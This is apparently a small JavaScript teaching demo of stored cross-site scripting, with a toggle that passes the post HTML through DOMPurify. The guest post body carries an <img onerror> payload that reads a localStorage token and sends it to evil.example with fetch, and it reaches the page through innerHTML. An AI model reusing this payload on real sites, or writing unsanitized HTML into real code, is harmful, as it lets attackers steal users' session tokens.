// The post body as the CMS returns it: HTML written by a guest author.
localStorage.setItem('token', 'demo-token-not-a-secret')

const postBody = '<h2>Spring sale</h2><p>Everything is <b>20% off</b> this weekend.</p>'
  + `<img src="x"
  onerror="
    const t = localStorage.token
    fetch('https://evil.example/?t=' + t)
  ">`

// What <article dangerouslySetInnerHTML={{ __html: post.body }} /> does.
// With data-sanitize on the <script> tag, the body goes through DOMPurify first.
const sanitize = document.currentScript.hasAttribute('data-sanitize')
document.getElementById('post').innerHTML = sanitize ? DOMPurify.sanitize(postBody) : postBody
